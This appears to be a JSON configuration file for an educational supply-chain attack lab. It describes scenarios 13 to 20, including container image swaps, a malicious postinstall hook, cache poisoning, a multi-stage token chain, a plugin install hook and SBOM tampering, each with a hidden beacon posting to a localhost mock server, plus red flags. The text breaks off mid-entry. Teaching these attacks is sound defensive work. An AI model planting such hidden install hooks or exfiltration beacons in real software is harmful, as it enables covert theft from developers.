      "payloadLines": [
        "http.request({",
        "  hostname: 'localhost',",
        "  port: 3001,",
        "  path: '/capture',",
        "  method: 'POST'",
        "})",
        "Body: hostname, note:metadata-manipulation-sim"
      ],
      "mockTitle": "mock-server :3001 on POST /capture",
      "mockLines": [
        "parse JSON → log CAPTURED DATA",
        "append captures[] → write captured-data.json → 200"
      ],
      "flociLines": [
        "SCAS_FLOCI_ENABLED=1",
        "uploadJson('13','metadata-exfil')"
      ],
      "coverTitle": "After beacon: metadata still looks clean",
      "coverLines": [
        "package name/description look safe",
        "API surface still usable",
        "behavior diverges from metadata story"
      ],
      "visibleLines": [
        "VISIBLE: install succeeds",
        "HIDDEN: :3001/capture beacon",
        "HINT: curl localhost:3001/captured-data"
      ]
    },
    "verifyLines": [
      "curl -s http://localhost:3001/captured-data",
      "→ { \"captures\": [ { timestamp, data } ] }",
      "",
      "or read:",
      "  infrastructure/captured-data.json",
      "",
      "Optional: floci/verify.sh"
    ],
    "redFlags": [
      "1. postinstall despite “clean” metadata",
      "2. POST /capture on port 3001",
      "3. anonymous top-level exfil",
      "4. Version bump 1.0.0 → 1.0.1",
      "5. Metadata ≠ runtime behavior"
    ],
    "safetyLines": [
      "TESTBENCH_MODE must be enabled",
      "  else [SAFE MODE] and stop",
      "Exfil hostname is localhost only",
      "Educational labels in package metadata",
      "setup.sh → enable-testbench.sh",
      "localhost / 127.0.0.1 evidence only",
      "No real external C2"
    ],
    "captureFile": "infrastructure/captured-data.json",
    "mockPort": "3001",
    "endpointPath": "/capture"
  },
  "14": {
    "id": "14",
    "title": "Container Image Supply Chain",
    "folder": "14-container-image-supply-chain-attack",
    "subtitle": "What the developer sees vs what actually runs — Compromised image CMD runs malicious-start.js → POST /capture on :3002",
    "intended": {
      "title": "Intended (review-only)",
      "path": "images/legitimate-image",
      "metaRows": [
        [
          "name",
          "legitimate-image"
        ],
        [
          "version",
          "(Dockerfile)"
        ],
        [
          "path",
          "images/legitimate-image"
        ],
        [
          "role",
          "review-only / expected"
        ],
        [
          "trigger",
          "clean app.js CMD"
        ]
      ]
    },
    "malicious": {
      "title": "Installed / active (victim uses)",
      "path": "images/compromised-image",
      "metaRows": [
        [
          "name",
          "compromised-image"
        ],
        [
          "version",
          "(Dockerfile)"
        ],
        [
          "path",
          "images/compromised-image"
        ],
        [
          "role",
          "active container entrypoint"
        ],
        [
          "trigger",
          "CMD malicious-start.js"
        ]
      ]
    },
    "compareRows": [
      [
        "image",
        "legitimate-image",
        "compromised-image",
        true
      ],
      [
        "CMD",
        "app.js",
        "malicious-start.js",
        true
      ],
      [
        "path",
        "images/legitimate-image",
        "images/compromised-image",
        true
      ],
      [
        "payload",
        "(none)",
        "anonymous top-level http",
        true
      ],
      [
        "endpoint",
        "N/A",
        "POST /capture :3002",
        true
      ]
    ],
    "deceptionPill": "image looks like app",
    "victimDep": {
      "label": "images/compromised-image/Dockerfile",
      "lines": [
        "CMD [\"node\", \"malicious-start.js\"]",
        "victim-app/Dockerfile: CMD app.js",
        "lab runs the compromised image"
      ]
    },
    "legitCode": {
      "title": "images/legitimate-image/app.js",
      "lines": [
        "clean container app entrypoint",
        "✓ No collector POST",
        "✓ No TESTBENCH gated exfil",
        "normal Dockerfile CMD"
      ]
    },
    "malCode": {
      "title": "images/compromised-image/malicious-start.js",
      "lines": [
        "anonymous top-level",
        "  if (TESTBENCH_MODE !== 'enabled') exit",
        "  hostname: SCAS_MOCK_HOST || 127.0.0.1",
        "  port: SCAS_MOCK_PORT || 3002",
        "  path: '/capture'",
        "Dockerfile CMD runs this file"
      ]
    },
    "codeEdgePill": "image CMD ≠ source app",
    "triggerStrip": "Trigger: container start → malicious-start.js  ·  Gate: TESTBENCH_MODE === 'enabled'  ·  Exfil: POST 127.0.0.1:3002/capture  ·  Evidence: infrastructure/captured-data.json  ·  Cover: container still “runs”",
    "setupLines": [
      "source enable-testbench.sh",
      "  → TESTBENCH_MODE=enabled",
      "build images/compromised-image",
      "start mock-server.js :3002",
      "run container with TESTBENCH_MODE"
    ],
    "mockLines": [
      "node infrastructure/mock-server.js",
      "listen http://localhost:3002",
      "init captured-data.json {captures:[]}",
      "POST /capture · GET /captured-data",
      "(Docker may use host.docker.internal)"
    ],
    "labLines": [
      "docker build compromised-image",
      "docker run -e TESTBENCH_MODE=enabled …",
      "  → malicious-start.js POST /capture"
    ],
    "runtime": {
      "victimBox": [
        "container CMD",
        "malicious-start.js"
      ],
      "malBox": [
        "anonymous top-level",
        "http.request"
      ],
      "payloadTitle": "HTTP request in anonymous top-level",
      "payloadLines": [
        "http.request({",
        "  hostname: '127.0.0.1' (or host.docker.internal),",
        "  port: 3002,",
        "  path: '/capture',",
        "  method: 'POST'",
        "})",
        "Body: host, ts, scenario:14-container-image"
      ],
      "mockTitle": "mock-server :3002 on POST /capture",
      "mockLines": [
        "parse JSON → log CAPTURED DATA",
        "append captures[] → write captured-data.json → 200"
      ],
      "flociLines": [
        "SCAS_FLOCI_ENABLED=1",
        "uploadJson('14', …) when set"
      ],
      "coverTitle": "After beacon: container appears up",
      "coverLines": [
        "CMD still “starts the app”",
        "no crash required for exfil",
        "image tag can look legitimate"
      ],
      "visibleLines": [
        "VISIBLE: container starts",
        "HIDDEN: /capture beacon to :3002",
        "HINT: curl localhost:3002/captured-data"
      ]
    },
    "verifyLines": [
      "curl -s http://localhost:3002/captured-data",
      "→ { \"captures\": [ { timestamp, data } ] }",
      "",
      "or read:",
      "  infrastructure/captured-data.json",
      "",
      "Optional: floci/verify.sh"
    ],
    "redFlags": [
      "1. Dockerfile CMD → malicious-start.js",
      "2. POST /capture on port 3002",
      "3. Default host 127.0.0.1 (Docker override)",
      "4. Not an npm package.json dependency",
      "5. Image differs from legitimate-image"
    ],
    "safetyLines": [
      "TESTBENCH_MODE must be enabled",
      "  else [SAFE MODE] and stop",
      "Exfil hostname is 127.0.0.1 only",
      "Educational labels in package metadata",
      "setup.sh → enable-testbench.sh",
      "localhost / 127.0.0.1 evidence only",
      "No real external C2"
    ],
    "captureFile": "infrastructure/captured-data.json",
    "mockPort": "3002",
    "endpointPath": "/capture"
  },
  "15": {
    "id": "15",
    "title": "Developer Tool Compromise",
    "folder": "15-developer-tool-compromise",
    "subtitle": "What the developer sees vs what actually runs — malicious dev-tool@9.9.9 postinstall beacons to localhost:3015/collect",
    "intended": {
      "title": "Intended (review-only)",
      "path": "dev-tools/legitimate-dev-tool",
      "metaRows": [
        [
          "name",
          "dev-tool"
        ],
        [
          "version",
          "1.0.0"
        ],
        [
          "path",
          "dev-tools/legitimate-dev-tool"
        ],
        [
          "role",
          "review-only / expected"
        ],
        [
          "trigger",
          "none / clean"
        ]
      ]
    },
    "malicious": {
      "title": "Installed / active (victim uses)",
      "path": "dev-tools/malicious-dev-tool",
      "metaRows": [
        [
          "name",
          "dev-tool"
        ],
        [
          "version",
          "9.9.9"
        ],
        [
          "path",
          "dev-tools/malicious-dev-tool"
        ],
        [
          "role",
          "installed / active"
        ],
        [
          "trigger",
          "postinstall.js"
        ]
      ]
    },
    "compareRows": [
      [
        "name",
        "dev-tool",
        "dev-tool",
        false
      ],
      [
        "version",
        "1.0.0",
        "9.9.9",
        true
      ],
      [
        "path",
        "legitimate-dev-tool",
        "malicious-dev-tool",
        true
      ],
      [
        "payload",
        "(none)",
        "anonymous postinstall",
        true
      ],
      [
        "deception",
        "trusted CLI",
        "compromised dev tool",
        true
      ]
    ],
    "deceptionPill": "trusted CLI version jump",
    "victimDep": {
      "label": "victim-app/package.json",
      "lines": [
        "dependencies: {",
        "  \"dev-tool\": \"file:../dev-tools/malicious-dev-tool\"",
        "}"
      ]
    },
    "legitCode": {
      "title": "dev-tools/legitimate-dev-tool",
      "lines": [
        "dev-tool@1.0.0 clean CLI",
        "✓ No postinstall",
        "✓ No TESTBENCH gated network",
        "run() cover API only"
      ]
    },
    "malCode": {
      "title": "dev-tools/malicious-dev-tool/postinstall.js",
      "lines": [
        "postinstall.js: anonymous top-level",
        "  if (TESTBENCH_MODE === 'enabled')",
        "    http.request POST localhost:3015/collect",
        "Body: attack:developer-tool-compromise,",
        "  tool:dev-tool@9.9.9, stage:postinstall",
        "index.js exports run() cover"
      ]
    },
    "codeEdgePill": "same CLI name",
    "triggerStrip": "Trigger: postinstall.js  ·  Gate: TESTBENCH_MODE === 'enabled'  ·  Exfil: POST localhost:3015/collect  ·  Evidence: infrastructure/captured-data.json  ·  Cover: run() still works",
    "setupLines": [
      "source enable-testbench.sh",
      "  → TESTBENCH_MODE=enabled",
      "seed malicious-dev-tool",
      "cd victim-app && npm install",
      "write infrastructure/mock-server.js"
    ],
    "mockLines": [
      "node infrastructure/mock-server.js",
      "listen http://localhost:3015",
      "init captured-data.json {captures:[]}",
      "POST /collect · GET /captured-data",
      "DELETE /captured-data"
    ],
    "labLines": [
      "cd victim-app && npm install",
      "  → postinstall → :3015/collect",
      "npm start"
    ],
    "runtime": {
      "victimBox": [
        "victim-app",
        "npm install"
      ],
      "malBox": [
        "postinstall.js",
        "anonymous top-level"
      ],
      "payloadTitle": "HTTP request in anonymous postinstall",
      "payloadLines": [
        "http.request({",
        "  hostname: 'localhost',",
        "  port: 3015,",
        "  path: '/collect',",
        "  method: 'POST'",
        "})",
        "Body: tool:dev-tool, toolVersion:9.9.9"
      ],
      "mockTitle": "mock-server :3015 on POST /collect",
      "mockLines": [
        "parse JSON → log CAPTURED DATA",
        "append captures[] → write captured-data.json → 200"
      ],
      "flociLines": [
        "SCAS_FLOCI_ENABLED=1",
        "uploadJson('15','devtool-exfil')"
      ],
      "coverTitle": "After beacon: CLI cover still runs",
      "coverLines": [
        "index.js run() still exports",
        "tool appears to work",
        "version 9.9.9 looks like an update"
      ],
      "visibleLines": [
        "VISIBLE: tool install succeeds",
        "HIDDEN: :3015 postinstall beacon",
        "HINT: [TESTBENCH] logs + mock CAPTURED DATA"
      ]
    },
    "verifyLines": [
      "curl -s http://localhost:3015/captured-data",
      "→ { \"captures\": [ { timestamp, data } ] }",
      "",
      "or read:",
      "  infrastructure/captured-data.json",
      "",
      "Optional: floci/verify.sh"
    ],
    "redFlags": [
      "1. Version jump 1.0.0 → 9.9.9",
      "2. postinstall.js anonymous exfil",
      "3. Port 3015 (scenario-specific)",
      "4. Developer-tool trust assumption",
      "5. http to localhost:3015/collect"
    ],
    "safetyLines": [
      "TESTBENCH_MODE must be enabled",
      "  else [SAFE MODE] and stop",
      "Exfil hostname is localhost only",
      "Educational labels in package metadata",
      "setup.sh → enable-testbench.sh",
      "localhost / 127.0.0.1 evidence only",
      "No real external C2"
    ],
    "captureFile": "infrastructure/captured-data.json",
    "mockPort": "3015",
    "endpointPath": "/collect"
  },
  "16": {
    "id": "16",
    "title": "Package Cache Poisoning",
    "folder": "16-package-cache-poisoning",
    "subtitle": "What the developer sees vs what actually runs — install-from-cache copies cache/cache-lib; anonymous top-level beacons on require to :3016",
    "intended": {
      "title": "Intended (review-only)",
      "path": "cache/legit-cache-lib",
      "metaRows": [
        [
          "name",
          "cache-lib"
        ],
        [
          "version",
          "1.0.0"
        ],
        [
          "path",
          "cache/legit-cache-lib"
        ],
        [
          "role",
          "review-only / expected"
        ],
        [
          "trigger",
          "none / clean"
        ]
      ]
    },
    "malicious": {
      "title": "Installed / active (victim uses)",
      "path": "cache/cache-lib",
      "metaRows": [
        [
          "name",
          "cache-lib"
        ],
        [
          "version",
          "2.0.0"
        ],
        [
          "path",
          "cache/cache-lib"
        ],
        [
          "role",
          "poisoned cache / active"
        ],
        [
          "trigger",
          "require → anonymous top-level"
        ]
      ]
    },
    "compareRows": [
      [
        "name",
        "cache-lib",
        "cache-lib",
        false
      ],
      [
        "version",
        "1.0.0",
        "2.0.0",
        true
      ],
      [
        "path",
        "cache/legit-cache-lib",
        "cache/cache-lib",
        true
      ],
      [
        "payload",
        "(none)",
        "anonymous top-level",
        true
      ],
      [
        "install",
        "registry",
        "install-from-cache.js copy",
        true
      ]
    ],
    "deceptionPill": "poisoned local cache",
    "victimDep": {
      "label": "victim-app/scripts/install-from-cache.js",
      "lines": [
        "postinstall copies cache/cache-lib",
        "  → victim-app/node_modules/cache-lib",
        "(no registry dependency entry)"
      ]
    },
    "legitCode": {
      "title": "cache/legit-cache-lib",
      "lines": [
        "cache-lib@1.0.0 clean",
        "✓ No outbound on require",
        "✓ No TESTBENCH gated network",
        "module.exports.run cover only"
      ]
    },
    "malCode": {
      "title": "cache/cache-lib/index.js",
      "lines": [
        "anonymous top-level",
        "  if (TESTBENCH_MODE === 'enabled')",
        "    http.request POST localhost:3016/collect",
        "Body: attack:package-cache-poisoning",
        "module.exports = { run }          ← cover"
      ]
    },
    "codeEdgePill": "same cache-lib name",
    "triggerStrip": "Trigger: require(cache-lib) anonymous top-level  ·  Gate: TESTBENCH_MODE === 'enabled'  ·  Exfil: POST localhost:3016/collect  ·  Evidence: infrastructure/captured-data.json  ·  Cover: run() still works",
    "setupLines": [
      "source enable-testbench.sh",
      "  → TESTBENCH_MODE=enabled",
      "seed cache/cache-lib (poison)",
      "victim postinstall: install-from-cache.js",
      "write infrastructure/mock-server.js"
    ],
    "mockLines": [
      "node infrastructure/mock-server.js",
      "listen http://localhost:3016",
      "init captured-data.json {captures:[]}",
      "POST /collect · GET /captured-data",
      "DELETE /captured-data"
    ],
    "labLines": [
      "cd victim-app && npm install",
      "  → copies cache/cache-lib",
      "npm start → require cache-lib"
    ],
    "runtime": {
      "victimBox": [
        "victim-app",
        "require(\"cache-lib\")"
      ],
      "malBox": [
        "cache/cache-lib",
        "anonymous top-level"
      ],
      "payloadTitle": "HTTP request in anonymous top-level",
      "payloadLines": [
        "http.request({",
        "  hostname: 'localhost',",
        "  port: 3016,",
        "  path: '/collect',",
        "  method: 'POST'",
        "})",
        "Body: stage:cache-lib-load, hostname…"
      ],
      "mockTitle": "mock-server :3016 on POST /collect",
      "mockLines": [
        "parse JSON → log CAPTURED DATA",
        "append captures[] → write captured-data.json → 200"
      ],
      "flociLines": [
        "SCAS_FLOCI_ENABLED=1",
        "uploadJson('16','cache-exfil')"
      ],
      "coverTitle": "After beacon: run() cover API",
      "coverLines": [
        "module.exports = { run }",
        "cache-lib appears to work",
        "install path was local cache copy"
      ],
      "visibleLines": [
        "VISIBLE: cache install + run OK",
        "HIDDEN: :3016 beacon on require",
        "HINT: compare cache/ vs legit-cache-lib"
      ]
    },
    "verifyLines": [
      "curl -s http://localhost:3016/captured-data",
      "→ { \"captures\": [ { timestamp, data } ] }",
      "",
      "or read:",
      "  infrastructure/captured-data.json",
      "",
      "Optional: floci/verify.sh"
    ],
    "redFlags": [
      "1. Path is cache/cache-lib (poisoned)",
      "2. install-from-cache.js bypasses registry",
      "3. anonymous top-level on require",
      "4. Port 3016",
      "5. http to localhost:3016/collect"
    ],
    "safetyLines": [
      "TESTBENCH_MODE must be enabled",
      "  else [SAFE MODE] and stop",
      "Exfil hostname is localhost only",
      "Educational labels in package metadata",
      "setup.sh → enable-testbench.sh",
      "localhost / 127.0.0.1 evidence only",
      "No real external C2"
    ],
    "captureFile": "infrastructure/captured-data.json",
    "mockPort": "3016",
    "endpointPath": "/collect"
  },
  "17": {
    "id": "17",
    "title": "Multi-Stage Attack Chain",
    "folder": "17-multi-stage-attack-chain",
    "subtitle": "What the developer sees vs what actually runs — stage1-access-lib then stage2-compromised-lib chain to 127.0.0.1:3017/collect",
    "intended": {
      "title": "Intended (review-only)",
      "path": "(no clean multi-stage pair)",
      "metaRows": [
        [
          "name",
          "clean libs (narrative)"
        ],
        [
          "version",
          "N/A"
        ],
        [
          "path",
          "packages/"
        ],
        [
          "role",
          "review-only / expected"
        ],
        [
          "trigger",
          "none / clean"
        ]
      ]
    },
    "malicious": {
      "title": "Installed / active (victim uses)",
      "path": "packages/stage1 + stage2",
      "metaRows": [
        [
          "name",
          "stage1-access-lib + stage2-…"
        ],
        [
          "version",
          "1.0.0"
        ],
        [
          "path",
          "packages/stage*-*"
        ],
        [
          "role",
          "installed / active"
        ],
        [
          "trigger",
          "stage1() + stage2Chain()"
        ]
      ]
    },
    "compareRows": [
      [
        "stage1",
        "N/A",
        "stage1() writes token + POST",
        true
      ],
      [
        "stage2",
        "N/A",
        "stage2Chain() reads token + POST",
        true
      ],
      [
        "host",
        "N/A",
        "127.0.0.1:3017",
        true
      ],
      [
        "payload",
        "(none)",
        "stage1 / stage2 / stage3",
        true
      ],
      [
        "deception",
        "two normal libs",
        "chained exfil",
        true
      ]
    ],
    "deceptionPill": "two-stage lib chain",
    "victimDep": {
      "label": "victim-app/package.json",
      "lines": [
        "dependencies: {",
        "  \"stage1-access-lib\": \"file:../packages/stage1-access-lib\",",
        "  \"stage2-compromised-lib\": \"file:../packages/stage2-compromised-lib\""
      ]
    },
    "legitCode": {
      "title": "(clean narrative — lab ships stages)",
      "lines": [
        "Lab focuses on malicious stage libs",
        "stage1 writes .stolen/token.json",
        "stage2 reads token + replication",
        "both POST 127.0.0.1:3017/collect"
      ]
    },
    "malCode": {
      "title": "packages/stage1 + stage2 index.js",
      "lines": [
        "stage1-access-lib: async function stage1()",
        "  writeToken(); postJson → 127.0.0.1:3017",
        "stage2-compromised-lib: stage2Chain()",
        "  readToken(); stage2 + stage3 POSTs",
        "hostname always 127.0.0.1 port 3017"
      ]
    },
    "codeEdgePill": "token handoff chain",
    "triggerStrip": "Trigger: stage1() then stage2Chain()  ·  Gate: TESTBENCH_MODE === 'enabled'  ·  Exfil: POST 127.0.0.1:3017/collect  ·  Evidence: infrastructure/captured-data.json  ·  Cover: libs still export APIs",
    "setupLines": [
      "source enable-testbench.sh",
      "  → TESTBENCH_MODE=enabled",
      "seed packages/stage1 + stage2",
      "cd victim-app && npm install",
      "write infrastructure/mock-server.js"
    ],
    "mockLines": [
      "node infrastructure/mock-server.js",
      "listen http://127.0.0.1:3017",
      "init captured-data.json {captures:[]}",
      "POST /collect · GET /captured-data",
      "DELETE /captured-data"
    ],
    "labLines": [
      "cd victim-app && npm start",
      "  calls stage1() then stage2Chain()",
      "captures stage1/stage2/stage3 events"
    ],
    "runtime": {
      "victimBox": [
        "victim-app/index.js",
        "stage1 → stage2Chain"
      ],
      "malBox": [
        "stage1()",
        "stage2Chain()"
      ],
      "payloadTitle": "HTTP via postJson to 127.0.0.1:3017",
      "payloadLines": [
        "postJson({ hostname: \"127.0.0.1\",",
        "  port: 3017, path: \"/collect\" }, …)",
        "Body stages: stage1 | stage2 | stage3",
        "stage1 writes .stolen/token.json",
        "stage2 reads token + replication/"
      ],
      "mockTitle": "mock-server :3017 on POST /collect",
      "mockLines": [
        "parse JSON → log CAPTURED DATA",
        "append captures[] → write captured-data.json → 200"
      ],
      "flociLines": [
        "SCAS_FLOCI_ENABLED=1",
        "uploadJson('17','stageN',…,'chain')"
      ],
      "coverTitle": "After chain: exports still present",
      "coverLines": [
        "module.exports = { stage1, getToken }",
        "module.exports = { stage2Chain }",
        "app flow looks like normal lib calls"
      ],
      "visibleLines": [
        "VISIBLE: staged API calls succeed",
        "HIDDEN: 127.0.0.1:3017 multi beacons",
        "HINT: inspect .stolen/ + captured-data"
      ]
    },
    "verifyLines": [
      "curl -s http://127.0.0.1:3017/captured-data",
      "→ { \"captures\": [ { timestamp, data } ] }",
      "",
      "or read:",
      "  infrastructure/captured-data.json",
      "",
      "Optional: floci/verify.sh"
    ],
    "redFlags": [
      "1. Two packages cooperate (stage1→stage2)",
      "2. Host is 127.0.0.1:3017 (not localhost string)",
      "3. Functions stage1 / stage2Chain",
      "4. Token file handoff under .stolen/",
      "5. stage3 replication evidence"
    ],
    "safetyLines": [
      "TESTBENCH_MODE must be enabled",
      "  else [SAFE MODE] and stop",
      "Exfil hostname is 127.0.0.1 only",
      "Educational labels in package metadata",
      "setup.sh → enable-testbench.sh",
      "localhost / 127.0.0.1 evidence only",
      "No real external C2"
    ],
    "captureFile": "infrastructure/captured-data.json",
    "mockPort": "3017",
    "endpointPath": "/collect"
  },
  "18": {
    "id": "18",
    "title": "Package Manager Plugin Attack",
    "folder": "18-package-manager-plugin-attack",
    "subtitle": "What the developer sees vs what actually runs — malicious-plugin installHook beacons to localhost:3018/collect during simulated install",
    "intended": {
      "title": "Intended (review-only)",
      "path": "packages/target-lib",
      "metaRows": [
        [
          "name",
          "target-lib"
        ],
        [
          "version",
          "1.0.0"
        ],
        [
          "path",
          "packages/target-lib"
        ],
        [
          "role",
          "install target / expected"
        ],
        [
          "trigger",
          "none / clean"
        ]
      ]
    },
    "malicious": {
      "title": "Installed / active (victim uses)",
      "path": "plugins/malicious-plugin",
      "metaRows": [
        [
          "name",
          "malicious-plugin"
        ],
        [
          "version",
          "(plugin)"
        ],
        [
          "path",
          "plugins/malicious-plugin"
        ],
        [
          "role",
          "active install hook"
        ],
        [
          "trigger",
          "installHook({projectRoot})"
        ]
      ]
    },
    "compareRows": [
      [
        "plugin",
        "(none)",
        "malicious-plugin",
        true
      ],
      [
        "hook",
        "N/A",
        "installHook",
        true
      ],
      [
        "path",
        "packages/target-lib",
        "plugins/malicious-plugin",
        true
      ],
      [
        "payload",
        "(none)",
        "installHook http POST",
        true
      ],
      [
        "deception",
        "normal install",
        "plugin intercepts install",
        true
      ]
    ],
    "deceptionPill": "install plugin hook",
    "victimDep": {
      "label": "victim-app (plugin simulation)",
      "lines": [
        "index.js → plugin-active → installHook",
        "scripts/run-plugin-install.js",
        "marks node_modules/target-lib/.infected-…"
      ]
    },
    "legitCode": {
      "title": "packages/target-lib",
      "lines": [
        "target-lib clean package",
        "✓ No install hooks",
        "✓ No TESTBENCH gated network",
        "plugin layer is the attack surface"
      ]
    },
    "malCode": {
      "title": "plugins/malicious-plugin/index.js",
      "lines": [
        "function installHook({ projectRoot }) {",
        "  if (TESTBENCH_MODE !== 'enabled') return",
        "  write .infected-by-plugin marker",
        "  http.request POST localhost:3018/collect",
        "}",
        "module.exports = { installHook }"
      ]
    },
    "codeEdgePill": "plugin wraps install",
    "triggerStrip": "Trigger: installHook({projectRoot})  ·  Gate: TESTBENCH_MODE === 'enabled'  ·  Exfil: POST localhost:3018/collect  ·  Evidence: infrastructure/captured-data.json  ·  Cover: install still completes",
    "setupLines": [
      "source enable-testbench.sh",
      "  → TESTBENCH_MODE=enabled",
      "seed plugins/malicious-plugin",
      "cd victim-app (plugin-active.js)",
      "write infrastructure/mock-server.js"
    ],
    "mockLines": [
      "node infrastructure/mock-server.js",
      "listen http://localhost:3018",
      "init captured-data.json {captures:[]}",
      "POST /collect · GET /captured-data",
      "DELETE /captured-data"
    ],
    "labLines": [
      "cd victim-app && npm start",
      "  → run-plugin-install → installHook",
      "check .infected-by-plugin marker"
    ],
    "runtime": {
      "victimBox": [
        "victim-app/index.js",
        "installHook(…)"
      ],
      "malBox": [
        "installHook",
        "http.request"
      ],
      "payloadTitle": "HTTP request built in installHook()",
      "payloadLines": [
        "http.request({",
        "  hostname: 'localhost',",
        "  port: 3018,",
        "  path: '/collect',",
        "  method: 'POST'",
        "})",
        "Body: attack:package-manager-plugin-attack"
      ],
      "mockTitle": "mock-server :3018 on POST /collect",
      "mockLines": [
        "parse JSON → log CAPTURED DATA",
        "append captures[] → write captured-data.json → 200"
      ],
      "flociLines": [
        "SCAS_FLOCI_ENABLED=1",
        "uploadJson('18','plugin-exfil')"
      ],
      "coverTitle": "After beacon: install looks done",
      "coverLines": [
        "installer promise resolves",
        "target-lib still present",
        "marker file is the IOC"
      ],
      "visibleLines": [
        "VISIBLE: plugin install simulation OK",
        "HIDDEN: :3018 installHook beacon",
        "HINT: .infected-by-plugin + captured-data"
      ]
    },
    "verifyLines": [
      "curl -s http://localhost:3018/captured-data",
      "→ { \"captures\": [ { timestamp, data } ] }",
      "",
      "or read:",
      "  infrastructure/captured-data.json",
      "",
      "Optional: floci/verify.sh"
    ],
    "redFlags": [
      "1. Function installHook intercepts install",
      "2. Writes .infected-by-plugin marker",
      "3. Port 3018",
      "4. Plugin path outside normal deps",
      "5. http to localhost:3018/collect"
    ],
    "safetyLines": [
      "TESTBENCH_MODE must be enabled",
      "  else [SAFE MODE] and stop",
      "Exfil hostname is localhost only",
      "Educational labels in package metadata",
      "setup.sh → enable-testbench.sh",
      "localhost / 127.0.0.1 evidence only",
      "No real external C2"
    ],
    "captureFile": "infrastructure/captured-data.json",
    "mockPort": "3018",
    "endpointPath": "/collect"
  },
  "19": {
    "id": "19",
    "title": "SBOM Manipulation",
    "folder": "19-sbom-manipulation-attack",
    "subtitle": "What the developer sees vs what actually runs — malicious-sbom-generator omits deps and exfiltrateEvidence POSTs to 127.0.0.1:3019/collect",
    "intended": {
      "title": "Intended (review-only)",
      "path": "truth/dependencies.json",
      "metaRows": [
        [
          "name",
          "truth dependencies"
        ],
        [
          "version",
          "N/A"
        ],
        [
          "path",
          "truth/dependencies.json"
        ],
        [
          "role",
          "ground truth"
        ],
        [
          "trigger",
          "none / clean"
        ]
      ]
    },
    "malicious": {
      "title": "Installed / active (victim uses)",
      "path": "sbom/malicious-sbom-generator.js",
      "metaRows": [
        [
          "name",
          "malicious-sbom-generator"
        ],
        [
          "version",
          "(script)"
        ],
        [
          "path",
          "sbom/malicious-sbom-generator.js"
        ],
        [
          "role",
          "active generator"
        ],
        [
          "trigger",
          "generateSbom → exfiltrateEvidence"
        ]
      ]
    },
    "compareRows": [
      [
        "sbom",
        "full truth deps",
        "omits maliciousOmitted",
        true
      ],
      [
        "path",
        "truth/dependencies.json",
        "sbom/malicious-sbom-generator.js",
        true
      ],
      [
        "payload",
        "(none)",
        "exfiltrateEvidence",
        true
      ],
      [
        "host",
        "N/A",
        "127.0.0.1:3019",
        true
      ],
      [
        "deception",
        "accurate SBOM",
        "tampered SBOM",
        true
      ]
    ],
    "deceptionPill": "SBOM omits real deps",
    "victimDep": {
      "label": "victim-app/index.js",
      "lines": [
        "loads truth/dependencies.json",
        "requires sbom/malicious-sbom-generator.js",
        "writes victim-app/sbom.json (omitted deps)"
      ]
    },
    "legitCode": {
      "title": "truth/dependencies.json",
      "lines": [
        "ground-truth dependency list",
        "includes maliciousOmitted entries",
        "✓ No network",
        "honest inventory for comparison"
      ]
    },
    "malCode": {
      "title": "sbom/malicious-sbom-generator.js",
      "lines": [
        "function exfiltrateEvidence(payload) {",
        "  hostname: '127.0.0.1', port: 3019,",
        "  path: '/collect'",
        "}",
        "async function generateSbom(…) {",
        "  omit deps → await exfiltrateEvidence",
        "}"
      ]
    },
    "codeEdgePill": "SBOM ≠ reality",
    "triggerStrip": "Trigger: generateSbom → exfiltrateEvidence  ·  Gate: TESTBENCH_MODE === 'enabled'  ·  Exfil: POST 127.0.0.1:3019/collect  ·  Evidence: infrastructure/captured-data.json  ·  Cover: sbom.json looks complete",
    "setupLines": [
      "source enable-testbench.sh",
      "  → TESTBENCH_MODE=enabled",
      "prep truth/ + sbom generator",
      "cd victim-app && npm start",
      "write infrastructure/mock-server.js"
    ],
    "mockLines": [
      "node infrastructure/mock-server.js",
      "listen http://127.0.0.1:3019",
      "init captured-data.json {captures:[]}",
      "POST /collect · GET /captured-data",
      "DELETE /captured-data"
    ],
    "labLines": [
      "cd victim-app && npm start",
      "  → generateSbom omits deps",
      "  → exfiltrateEvidence to :3019",
      "diff sbom.json vs truth/"
    ],
    "runtime": {
      "victimBox": [
        "victim-app/index.js",
        "generateSbom(…)"
      ],
      "malBox": [
        "exfiltrateEvidence",
        "http.request"
      ],
      "payloadTitle": "HTTP request built in exfiltrateEvidence()",
      "payloadLines": [
        "http.request({",
        "  hostname: '127.0.0.1',",
        "  port: 3019,",
        "  path: '/collect',",
        "  method: 'POST'",
        "})",
        "Body: omit[], generatedDependencies…"
      ],
      "mockTitle": "mock-server :3019 on POST /collect",
      "mockLines": [
        "parse JSON → log CAPTURED DATA",
        "append captures[] → write captured-data.json → 200"
      ],
      "flociLines": [
        "SCAS_FLOCI_ENABLED=1",
        "uploadJson('19','sbom-exfil')"
      ],
      "coverTitle": "After beacon: sbom.json looks fine",
      "coverLines": [
        "public SBOM omits malicious deps",
        "bomFormat: educational-sbom-v1",
        "truth/ still has full inventory"
      ],
      "visibleLines": [
        "VISIBLE: SBOM file written",
        "HIDDEN: 127.0.0.1:3019 evidence POST",
        "HINT: compare truth/ vs sbom.json"
      ]
    },
    "verifyLines": [
      "curl -s http://127.0.0.1:3019/captured-data",
      "→ { \"captures\": [ { timestamp, data } ] }",
      "",
      "or read:",
      "  infrastructure/captured-data.json",
      "",
      "Optional: floci/verify.sh"
    ],
    "redFlags": [
      "1. generateSbom filters maliciousOmitted",
      "2. Function exfiltrateEvidence",
      "3. Host 127.0.0.1:3019",
      "4. SBOM diverges from truth/",
      "5. http POST /collect during generation"
    ],
    "safetyLines": [
      "TESTBENCH_MODE must be enabled",
      "  else [SAFE MODE] and stop",
      "Exfil hostname is 127.0.0.1 only",
      "Educational labels in package metadata",
      "setup.sh → enable-testbench.sh",
      "localhost / 127.0.0.1 evidence only",
      "No real external C2"
    ],
    "captureFile": "infrastructure/captured-data.json",
    "mockPort": "3019",
    "endpointPath": "/collect"
  },
  "20": {
    "id": "20",
    "title": "Package Version Confusion",
    "folder": "20-package-version-confusion",
    "subtitle": "What the developer sees vs what actually runs — version-confuser-lib@999.999.999 anonymous top-level beacons on require to :3020",
    "intended": {
      "title": "Intended (review-only)",
      "path": "registry/version-confuser-lib/1.0.1",
      "metaRows": [
        [
          "name",
          "version-confuser-lib"
        ],
        [
          "version",
          "1.0.1"
        ],
        [
          "path",
          "registry/…/1.0.1"
        ],
        [
          "role",
          "review-only / expected"
        ],
        [
          "trigger",
          "none / clean"
        ]
      ]
    },
    "malicious": {
      "title": "Installed / active (victim uses)",
      "path": "registry/version-confuser-lib/999.999.999",
      "metaRows": [
        [
          "name",
